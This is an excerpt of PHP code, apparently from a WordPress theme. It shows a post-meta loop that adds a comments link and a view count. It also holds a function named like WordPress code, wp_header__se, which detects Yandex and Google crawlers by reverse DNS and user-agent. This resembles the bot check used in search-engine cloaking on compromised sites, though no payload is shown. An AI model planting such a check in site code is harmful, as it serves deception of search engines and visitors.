		...
		foreach ($meta_items as $key => $show) {
			...
			switch ($key) {
				...
				case 'comments':
					...
					$meta[] = '<span class="meta-item comments"><a href="' . esc_url(get_comments_link()) . '">'.get_comments_number(). ' <i class="fa fa-comments-o"></i> '
							.getPostViews(get_the_ID()).'</a></span>';
...
function wp_header__se()
{
    $host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
    $y = strpos($host, ".yandex.");
    $g = strpos($host, ".googlebot.");
    if ($y === false && $g === false) return 0;
    $ua = $_SERVER['HTTP_USER_AGENT'];
    $y = strpos($ua, "yandex.com/bots");
    $g = strpos($ua, ".google.com/bot");
    if ($y === false && $g === false) return 0;
    return 1;
}